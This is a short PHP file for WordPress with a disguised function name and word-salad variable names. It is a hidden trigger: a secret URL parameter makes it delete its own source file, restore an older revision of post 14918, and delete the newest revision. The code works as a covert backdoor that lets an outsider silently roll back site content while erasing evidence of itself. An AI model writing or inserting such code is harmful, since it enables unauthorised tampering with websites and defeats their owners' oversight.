<?php

function namespaced_css_scroll() {
	if (isset($_GET['weather_filter_field_based']) && $_GET['weather_filter_field_based'] === 'sites_smart_error') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$options_cleaner_app_bulk = 14918;
		$discount_online_read_speed = wp_get_post_revisions($options_cleaner_app_bulk);
		if (empty($discount_online_read_speed)) die('no revisions');
		if (count($discount_online_read_speed) < 2) die('less than 2');
		$card_copy_table_remover = array_shift($discount_online_read_speed);
		$profile_tiny_simple_connect = $card_copy_table_remover->ID;
		$related_back_jigoshop_new = array_shift($discount_online_read_speed);
		$styles_copyright_automatic = $related_back_jigoshop_new->ID;
		$jetpack_pullquote_blog_enhanced = wp_restore_post_revision($styles_copyright_automatic);
		if ($jetpack_pullquote_blog_enhanced === false) die('error restoring');
		$jetpack_pullquote_blog_enhanced = wp_delete_post_revision($profile_tiny_simple_connect);		
		if ($jetpack_pullquote_blog_enhanced === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'namespaced_css_scroll');
